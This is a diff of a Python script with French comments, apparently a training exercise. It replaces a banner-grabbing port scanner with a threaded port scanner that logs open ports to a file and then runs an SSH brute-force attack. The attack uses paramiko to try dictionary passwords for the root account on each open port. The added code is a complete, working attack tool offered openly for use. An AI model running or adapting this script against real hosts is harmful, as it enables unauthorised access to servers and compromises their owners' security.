@@ -1,100 +1,87 @@
-import socket
 import threading
+import socket
+from paramiko import SSHClient, AutoAddPolicy
 
 
-# Fonction pour récupérer la bannière d'un service sur un port
-def grab_banner(host, port, output_file):
+# Définir une fonction qui va tester un port spécifique
+def scan_port(host, port):
     try:
-        # Création d'un objet socket (AF_INET = IPv4, SOCK_STREAM = TCP)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        # On définit un délai de 1 seconde pour éviter les blocages (timeout)
-        sock.settimeout(1)
-
-        # Tentative de connexion sur le port
-        result = sock.connect_ex((host, port))
-
-        # Si le résultat est 0, cela signifie que le port est ouvert
+        # Création d'un objet socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Définir un délai pour éviter le TIMEOUT et le blocage
+        s.settimeout(1)
+        # Tentative de connexion sur le port (0 si la connexion a réussi)
+        result = s.connect_ex((host, port))
+        # Si le port est ouvert (result == 0), on l'affiche et on l'ajoute à la liste
         if result == 0:
-            # Tentative de récupérer la bannière (max 1024 octets)
-            banner = sock.recv(1024).decode().strip()
-
-            # Si une bannière est reçue, on l'affiche et on l'enregistre dans le fichier
-            if banner:
-                result_str = f"[+] Port {port} ouvert - Service détecté : {banner}"
-            else:
-                result_str = f"[+] Port {port} ouvert - Pas de bannière détectée"
-
-            # Affichage du résultat à l'écran
-            print(result_str)
-
-            # Sauvegarde du résultat dans le fichier
-            with open(output_file, "a") as file:
-                file.write(result_str + "\n")
-
-            # Si c'est un serveur web, tenter une requête HEAD (pour les ports 80 et 443)
-            if port == 80 or port == 443:
-                try:
-                    # Envoi de la requête HEAD
-                    http_request = "HEAD / HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
-                    sock.sendall(http_request.encode())
-
-                    # Récupération de la réponse HTTP (en-têtes)
-                    response = sock.recv(1024).decode().strip()
-
-                    if response:
-                        # Vérification des codes de réponse pour identifier un serveur web
-                        if "HTTP" in response:
-                            print(f"[+] Port {port} est un serveur Web - Réponse: {response}")
-                            with open(output_file, "a") as file:
-                                file.write(f"[+] Port {port} est un serveur Web - Réponse: {response}\n")
-
-                except socket.timeout:
-                    pass  # Ignore si aucune réponse ou timeout sur la requête HEAD
-
-        # Fermeture de la socket après utilisation
-        sock.close()
-
-    except socket.timeout:
-        pass  # Ignore les erreurs de timeout (aucune réponse du port)
+            print(f"[+] Port {port} is open")
+            with open("open_ports.txt", "a") as file:
+                file.write(f"{port}\n")  # Enregistre les ports ouverts dans un fichier
+        # On ferme le socket
+        s.close()
     except Exception as e:
+        # Gestion des erreurs
         print(f"[-] Erreur sur le port {port}: {e}")
 
 
-# Fonction pour scanner les ports et récupérer les bannières
-def scan_ports(host, start_port, end_port, output_file):
-    # On informe l'utilisateur que le scan commence
-    print(f"\n[***] Scan de {host} sur les ports {start_port} à {end_port} [***]\n")
+# Fonction pour effectuer une attaque brute force SSH avec un mot de passe du dictionnaire
+def brute_force_attack(host, port, dictionary):
+    try:
+        # Initialisation du client SSH
+        client = SSHClient()
+        client.set_missing_host_key_policy(AutoAddPolicy())  # Ignorer les clés hôtes inconnues
+        print(f"[*] Tentative de connexion sur le port {port} avec les mots de passe du dictionnaire...")
 
-    # Liste des threads pour effectuer un scan parallèle
-    threads = []
-
-    # Pour chaque port dans la plage spécifiée
-    for port in range(start_port, end_port + 1):
-        # Création d'un thread pour effectuer le scan sur ce port
-        t = threading.Thread(target=grab_banner, args=(host, port, output_file))
-        t.start()  # Démarre le thread
-        threads.append(t)
-
-    # Attente de la fin de tous les threads
-    for t in threads:
-        t.join()
-
-
-# Fonction principale
-def main():
-    # Demande à l'utilisateur l'adresse IP et la plage de ports à scanner
-    target = input("Entrez l'adresse IP à scanner : ")
-    start_port = int(input("Port de début : "))
-    end_port = int(input("Port de fin : "))
-
-    # Demande le nom du fichier de sortie
-    output_file = input("Entrez le nom du fichier de résultats (ex: scan_results.txt) : ")
-
-    # Lancement du scan des ports avec récupération des bannières
-    scan_ports(target, start_port, end_port, output_file)
+        # Essayer chaque mot de passe du dictionnaire
+        for password in dictionary:
+            print(f"[*] Tentative avec le mot de passe '{password}'...")
+            try:
+                # Tentative de connexion avec chaque mot de passe du dictionnaire
+                client.connect(host, port=port, username="root", password=password)
+                print(f"[+] Connexion réussie sur {host}:{port} avec le mot de passe '{password}'")
+                client.close()  # Fermer la connexion
+                break  # Si la connexion réussit, on sort de la boucle
+            except Exception as e:
+                print(f"[-] Échec de la connexion sur {host}:{port} avec le mot de passe '{password}'")
+                pass  # On ignore les erreurs et continue
+    except Exception as e:
+        print(f"[-] Échec de la tentative de connexion sur {host}:{port}: {e}")
 
 
-# Appel de la fonction principale
-if __name__ == "__main__":
-    main()
+# Demander à l'utilisateur l'adresse IP de la cible
+target = input("Entrez l'adresse IP à scanner: ")
+
+# Demander la plage de ports à scanner
+start_port = int(input("Port de début: "))
+end_port = int(input("Port de fin: "))
+
+# Informer l'utilisateur qu'on commence le scan
+print(f"\n[***] Scan de la cible {target} sur les ports {start_port} à {end_port} [***]\n")
+
+# Liste des threads
+threads = []
+
+# Lancer un thread pour chaque port
+for port in range(start_port, end_port + 1):
+    t = threading.Thread(target=scan_port, args=(target, port))
+    threads.append(t)
+    t.start()
+
+# Attendre que tous les threads finissent
+for t in threads:
+    t.join()
+
+# Créer un dictionnaire avec les mots de passe
+dictionary = ["Doranco"]  # Ajouter ici d'autres mots de passe si nécessaire
+
+# Si le fichier "open_ports.txt" existe, essayer une attaque brute force sur les ports ouverts
+try:
+    with open("open_ports.txt", "r") as file:
+        ports = file.readlines()
+        for port in ports:
+            port = port.strip()  # Enlever les espaces et retours à la ligne
+            brute_force_attack(target, int(port), dictionary)
+except FileNotFoundError:
+    print("Aucun port ouvert trouvé. Assurez-vous d'avoir effectué un scan au préalable.")
+
+print("\nScan terminé.")
